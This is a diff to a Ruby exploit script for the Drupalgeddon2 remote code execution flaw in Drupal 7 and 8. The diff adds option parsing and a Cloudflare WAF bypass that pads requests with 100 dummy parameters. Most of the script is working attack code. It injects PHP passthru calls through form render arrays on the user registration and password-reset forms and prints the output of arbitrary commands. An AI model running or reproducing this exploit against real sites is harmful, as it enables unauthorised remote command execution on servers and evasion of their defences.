@@ -7,7 +7,45 @@ require 'json'
 require 'net/http'
 require 'openssl'
 require 'nokogiri'
+require 'optparse'
 
+options = {}
+options[:cloudflare] = false
+
+OptionParser.new do |opts|
+  opts.banner = "Usage example: ./drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id\nMore info: -h"
+  options[:banner] = opts.banner
+
+  opts.on("-u URL", "--url URL", "[Required] Service URL") do |d|
+    options[:url] = d
+  end
+
+  opts.on("-v VERSION", "--version VERSION", "[Required] Target Drupal version {7,8}") do |d|
+    options[:version] = d
+  end
+
+  opts.on("-c COMMAND", "--command COMMAND", "[Required] Command to execute") do |d|
+    options[:command] = d
+  end
+
+  opts.on("-m PHP_METHOD", "--method PHP_METHOD", "[Optional] PHP Method to use, by default: passthru") do |d|
+    options[:command] = d
+  end
+
+  opts.on("--form", "[Optional] Form to attack, by default '/user/password' in Drupal 7 and '/user/register' in Drupal 8") do |d|
+    options[:form] = d
+  end
+
+  opts.on("--cloudflare", "[Optional] Tries to bypass Cloudflare using Lua-Nginx +100 parameters WAF Bypass") do |d|
+    options[:cloudflare] = true
+  end
+
+  opts.on("-h", "--help", "Prints this help") do
+    puts opts
+    exit
+  end
+
+end.parse!
 
 #
 # Utils module for general and unrelated operations
@@ -41,11 +79,12 @@ class Target
   #   PHP method to use, by default passtrhu
   # @param [String] command
   #   Command to execute
-  def initialize(host, command, php_method = 'passthru', form_path = 0)
+  def initialize(host, command, php_method = 'passthru', form_path, cf_bypass)
     @host       = host
     @php_method = php_method
     @command    = command
     @uri        = URI.parse(host)
+    @cf_bypass  = cf_bypass
 
     @form_path = form_path
     @http      = create_http
@@ -73,10 +112,10 @@ class Target
   #   also, it cheers up if true 
   def is_response_200?(response)
     if response.code == "200"
-      success('Target seems to be exploitable! w00hooOO!')
+      puts success('Target seems to be exploitable! w00hooOO!')
       return true
     else
-      failed('Response: ' + response.code)
+      puts error('Response: ' + response.code)
       return false
     end
   end
@@ -96,29 +135,42 @@ class Target
 end
 
 class Drupal8 < Target
-  def initialize(host, command, php_method = 'passthru', form_path = 0)
-    super(host, command, php_method, form_path)
+  def initialize(host, command, php_method = 'passthru', form_path, cf_bypass)
+    super(host, command, php_method, form_path, cf_bypass)
   end
 
   # Not finished yet
   def exploit
 
     # Make the request
-    post_path = "#{@uri.path}user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"
+    params = 'element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax'
+    if @cf_bypass
+      params = 'a=&'*100 + params
+    end
+
+    post_path = "#{@uri.path}#{@form_path}/?#{params}"
+    
+    puts info("Requesting: #{post_path}")
     req       = Net::HTTP::Post.new(URI.encode(post_path))
     req.body  = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + 
                 @php_method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command
-    
-    res = @http.request(req)
-    is_response_200?(res)
-    puts res.body.split('[{"command"')[0]
 
+    if @cf_bypass
+      req.body = 'a=&'*100 + req.body
+    end
+
+    puts info("POST: #{req.body}")
+    res = @http.request(req)
+
+    if is_response_200?(res) then 
+      puts res.body.split('[{"command"')[0]
+    end
   end
 end
 
 class Drupal7 < Target
-  def initialize(host,command,php_method='passthru',form_path=0)
-    super(host, command, php_method, form_path)
+  def initialize(host,command,php_method='passthru',form_path, cf_bypass)
+    super(host, command, php_method, form_path, cf_bypass)
   end
 
   def get_form_build_id(response)
@@ -130,13 +182,22 @@ class Drupal7 < Target
   def exploit
 
     payload = URI.encode("name[#post_render][]=#{@php_method}&name[#markup]=#{@command}&name[#type]=markup")
-    if @form_path == '0'
+
+    if @cf_bypass
+      payload = "a=&"*100 + payload
+    end
+    
+    if @form_path.include? 'user/password'
+      form  = '/user/password/?'
+      form2 = 'file'
+    elsif (@form_path.include? 'q=') && (@form_path.include? 'password') # Hacky as fuck
       form  = '/?q=user/password&'
       form2 = '?q=file'
     else
-      form  = '/user/password/?'
+      form = @form_path
       form2 = 'file'
     end
+
     payload = @uri.path + form + payload
 
     puts info("Requesting: " + @uri.host + payload)
@@ -147,7 +208,7 @@ class Drupal7 < Target
     req.body = 'form_id=user_pass&_triggering_element_name=name'
 
     res1 = @http.request(req)
-    puts info(res.code)
+    puts info(res1.code)
 
     form_build_id = get_form_build_id(res1.body)
 
@@ -167,9 +228,9 @@ class Drupal7 < Target
 
       if res2.body.split('[{"command"')[0] == ""
         if(@command != 'id')
-          failed("Maybe incorrect input command, try simple command as 'id'")
+          error("Maybe incorrect input command, try simple command as 'id'")
         end
-          failed("")
+          error("")
       end
 
       puts res2.body.split('[{"command"')[0]
@@ -179,28 +240,19 @@ class Drupal7 < Target
   end
 end
 
-
-# Quick how to use
-if ARGV.empty? || ARGV.length < 2 || ARGV[0] == "-h" || ARGV[0] == "--help"
-  puts "Usage: ruby drupalggedon2.rb <target> <version [7,8]> <command> [php_method] [form_path]"
-  puts "       ruby drupalgeddon2.rb 7 https://example.com whoami passtrhu [0,1]"
-  puts "form_path: 0 => Vulnerable form on /?q=user/password"
-  puts "form_path: 1 => Vulnerable form on /user/password"
-  exit
-end
-
 # Read in values
-target     = ARGV[0]
-version    = ARGV[1]
-command    = ARGV[2]
-php_method = ARGV[3] || 'passthru' # FIXME: the condition wont match if user put 4 args 
-form_path  = ARGV[4] || 0
+target     = options[:url]
+version    = options[:version]
+command    = options[:command]
+php_method = options[:method] || 'passthru'
+form_path  = options[:version] == '7' ? 'user/password' : 'user/register'
+cf_bypass  = options[:cloudflare]
 
 case version
 when "7"
-  Drupal7.new(target, command, php_method, form_path).exploit
+  Drupal7.new(target, command, php_method, form_path, cf_bypass).exploit
 when "8"
-  Drupal8.new(target, command, php_method, form_path).exploit
+  Drupal8.new(target, command, php_method, form_path, cf_bypass).exploit
 else
-  Drupal8.new(target, command, php_method, form_path).exploit
+  Drupal8.new(target, command, php_method, form_path, cf_bypass).exploit
 end
